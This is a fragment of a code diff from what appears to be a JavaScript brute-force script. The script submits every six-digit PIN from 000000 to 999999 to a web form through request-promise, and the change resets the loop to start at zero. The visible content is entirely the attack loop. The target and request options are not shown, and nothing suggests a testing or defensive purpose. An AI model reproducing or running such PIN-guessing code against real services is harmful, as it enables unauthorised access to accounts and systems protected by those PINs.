@@ -32,7 +32,7 @@ let options = {
 const timeout = ms => new Promise((resolve, reject) => setTimeout(resolve, ms))
 
 async function main () {
-  for (let pin = 396200; pin < 999999; pin++) {
+  for (let pin = 000000; pin < 999999; pin++) {
     const pinFormatted = pin.toString().padStart(6, '0')
     options.form.pin = pinFormatted
     await rp(options)
